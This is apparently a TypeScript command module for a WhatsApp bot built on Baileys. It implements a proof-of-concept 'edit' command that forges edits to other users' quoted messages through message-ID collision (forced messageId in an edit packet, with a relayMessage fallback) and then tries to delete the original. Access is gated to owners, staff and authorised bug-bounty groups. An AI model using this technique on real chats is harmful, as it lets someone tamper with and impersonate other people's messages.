import type { WASocket } from 'baileys'
import type { BotCommand, CommandContext } from '../types.js'
import { isPocChatAllowed } from '../services/security-poc-scope.js'
import { getContextInfo } from '../utils/message.js'

const MAX_EDIT_TEXT = 3500

type ValleyEditContext = {
  jid: string
  replyId: string
  sock: WASocket
  baseId?: string | null
  baseText?: string
}

type ValleyEditResolvedContext = {
  jid: string
  replyId: string
  sock: WASocket
  baseId: string
  baseText: string
}

/**
 * Port TypeScript del método de edición de VALLEY-STUDIOS/ValleyBot.
 *
 * Mantiene la secuencia original:
 * 1. reutilizar baseId o crear un mensaje base;
 * 2. usar el ID base en edit.id;
 * 3. forzar replyId como messageId del paquete de edición;
 * 4. ejecutar el callback con el contexto resuelto.
 *
 * Copyright (c) 2026 Valley Studios — código original bajo licencia MIT.
 */
async function executeEditMessageIdPoc(
  input: ValleyEditContext,
  text: string,
  callback?: (ctx: ValleyEditResolvedContext) => Promise<void> | void,
) {
  const {
    jid,
    replyId,
    sock,
    baseId,
    baseText = '',
  } = input

  if (!jid) {
    throw new Error('JID not found.')
  }

  if (!replyId) {
    throw new Error('Reply message ID not found.')
  }

  if (!sock) {
    throw new Error('Sock not found.')
  }

  let msgId = baseId ?? undefined

  if (!msgId) {
    const sent = await sock.sendMessage(jid, {
      text: baseText,
    })

    msgId = sent?.key?.id ?? undefined
  }

  if (!msgId) {
    throw new Error('Message ID not found.')
  }

  await sock.sendMessage(
    jid,
    {
      text,
      edit: {
        id: msgId,
      },
    } as never,
    {
      messageId: replyId,
    },
  )

  const nextCtx: ValleyEditResolvedContext = {
    jid,
    replyId,
    sock,
    baseId: msgId,
    baseText: text,
  }

  await callback?.(nextCtx)

  return {
    success: true,
    ctx: nextCtx,
  }
}

/**
 * Port TypeScript del núcleo usado por VALLEY-STUDIOS/ValleyInvisible.
 *
 * La operación se conserva tal cual: construir un extendedTextMessage y
 * transmitirlo con relayMessage forzando customId como messageId.
 *
 * Copyright (c) 2026 Valley Studios — código original bajo licencia MIT.
 */
async function executeValleyInvisibleMessageIdCollision(
  sock: WASocket,
  targetJid: string,
  customId: string,
  messageText: string,
) {
  const messageContent = {
    extendedTextMessage: {
      text: messageText,
    },
  }

  await sock.relayMessage(targetJid, messageContent, {
    messageId: customId,
  })
}

function assertBugBountyScope(ctx: CommandContext) {
  if (!ctx.isOwner && !ctx.isBotStaff) {
    throw new Error('Solo el owner y el staff del bot pueden usar este comando.')
  }
  if (!ctx.isGroup) {
    throw new Error('La PoC de edición solo puede ejecutarse dentro de un grupo de pruebas autorizado.')
  }
  if (!isPocChatAllowed(ctx.chatId)) {
    throw new Error(`Este grupo no está autorizado para la PoC. Usa ${ctx.prefix}pocgroup add dentro del grupo primero.`)
  }
}

async function editQuotedMessagePoc(ctx: CommandContext) {
  assertBugBountyScope(ctx)

  const context = getContextInfo(ctx.message)
  const targetMessageId = context?.stanzaId
  const newText = ctx.argText.trim()

  if (!targetMessageId) {
    throw new Error('Debes responder al mensaje que quieres usar como objetivo de la PoC.')
  }
  if (!newText) {
    throw new Error(`Uso: ${ctx.prefix}edit <nuevo texto>, respondiendo al mensaje objetivo.`)
  }
  if (newText.length > MAX_EDIT_TEXT) {
    throw new Error(`El texto editado está limitado a ${MAX_EDIT_TEXT} caracteres.`)
  }

  // Equivalente a ctx.context.bot.id === ctx.context.user.id del ValleyBot:
  // si el comando proviene de la propia cuenta conectada, su ID sirve como base.
  // En caso contrario se crea el mensaje base vacío, exactamente como el original.
  const baseId = ctx.message.key.fromMe ? ctx.message.key.id : undefined

  try {
    await executeEditMessageIdPoc(
      {
        jid: ctx.chatId,
        replyId: targetMessageId,
        sock: ctx.socket as unknown as WASocket,
        baseId,
        baseText: '',
      },
      newText,
      async (data) => {
        // ValleyBot elimina el stanzaId citado después de emitir la edición.
        await data.sock.sendMessage(data.jid, {
          delete: {
            id: data.replyId,
          },
        } as never).catch(() => undefined)
      },
    )
    return
  } catch (valleyBotError) {
    // Compatibilidad literal con ValleyInvisible: si el transporte de edición
    // de ValleyBot es rechazado, se conserva su primitive de colisión de ID.
    try {
      await executeValleyInvisibleMessageIdCollision(
        ctx.socket as unknown as WASocket,
        ctx.chatId,
        targetMessageId,
        newText,
      )
      return
    } catch (valleyInvisibleError) {
      const primary = valleyBotError instanceof Error ? valleyBotError.message : String(valleyBotError)
      const fallback = valleyInvisibleError instanceof Error ? valleyInvisibleError.message : String(valleyInvisibleError)
      throw new Error(`No se pudo ejecutar la edición. ValleyBot: ${primary}. ValleyInvisible: ${fallback}.`)
    }
  }
}

const editCommand: BotCommand = {
  name: 'edit',
  aliases: ['editbot', 'editar', 'valleyedit'],
  category: 'owner',
  description: 'PoC de edición por stanzaId con compatibilidad ValleyBot/ValleyInvisible, limitada a grupos de bug bounty autorizados.',
  usage: 'edit <nuevo texto>',
  staffOnly: true,
  groupOnly: true,
  handler: editQuotedMessagePoc,
}

export const editCommands: BotCommand[] = [editCommand]
export default editCommand
